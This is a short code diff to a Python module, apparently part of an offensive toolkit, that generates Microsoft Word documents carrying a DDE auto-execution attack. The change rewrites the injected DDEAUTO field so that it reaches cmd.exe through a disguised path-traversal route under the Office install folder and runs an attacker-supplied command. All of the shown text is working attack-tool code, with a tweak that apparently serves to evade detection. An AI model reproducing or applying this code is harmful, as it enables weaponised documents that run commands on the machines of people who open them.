@@ -15,7 +15,6 @@ class WordDDE(WordGenerator):
     """ 
     Module used to generate MS Word file with DDE object attack
     Inspired by: https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
-    ex: download execute file:
     """
          
     
@@ -44,8 +43,8 @@ class WordDDE(WordGenerator):
         commandFile =self.getCMDFile()    
         with open (commandFile, "r") as f:
             command=f.read()
-            
-        ddeCmd = r'c:\\windows\\system32\\cmd.exe "/k %s"' % command.rstrip()
+        
+        ddeCmd = r'"\"c:\\Program Files\\Microsoft Office\\MSWORD\\..\\..\\..\\windows\\system32\\cmd.exe\" /c %s" "."' % command.rstrip()
         wdFieldDDEAuto=46
         document.Fields.Add(Range=word.Selection.Range,Type=wdFieldDDEAuto, Text=ddeCmd, PreserveFormatting=False)
         
